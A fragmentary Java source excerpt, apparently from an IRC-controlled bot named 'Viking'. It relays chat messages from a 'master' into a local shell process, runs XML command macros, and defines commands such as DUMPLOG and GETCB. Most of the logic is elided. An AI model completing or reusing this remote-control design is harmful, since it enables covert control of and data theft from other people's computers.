...
public class Viking implements Runnable {
    ...
    private static final int GETCB = 11;
    private static final int MACRO = 12;
    private static final int ECHO = 13;
    private static final int SLEEP = 14;
    private static final int DUMPLOG = 15;
...
//            mUserInputMon.addUserInputListener(mUserIRCClient);
    ...
    private void processServerMessage(String line) throws IOException {
        ...
        if (keyword.trim().equals(PRIVMSG.trim()))
            if (!from.equals(mCurrentAuthorizedMaster)) {
                ...
                //First attempt to write to the shell process
                if (writeToShellProcess(msg))
                    return;
                //If that failed, process message as a normal command
                processPrivMsg(msg);
            }
    ...
    private boolean writeToShellProcess(String msg) throws IOException {
        try {
            //Stop the process if the message is "END SHELL"
    ...
    private void runMacro(String macroname, String args[]) throws IOException {
        try {
            ...
            for (int i = 0; i < argNodes.getLength(); i++) {
                ...
                argList.add(node.getTextContent());
            }
            argList.trimToSize();
            ...
            NodeList commands = doc.getElementsByTagName("commands").item(0).getChildNodes();
            for (int i = 0; i < commands.getLength(); i++) {
                Node node = commands.item(i);
                if (!node.getNodeName().equals("cmd")) continue;
                String line = node.getTextContent();
                for (int j = 0; j < arguments.length; j++) {
                    line = line.replaceAll("%" + arguments[j] + "%", args[j]);
                }
                processPrivMsg(line);
            }
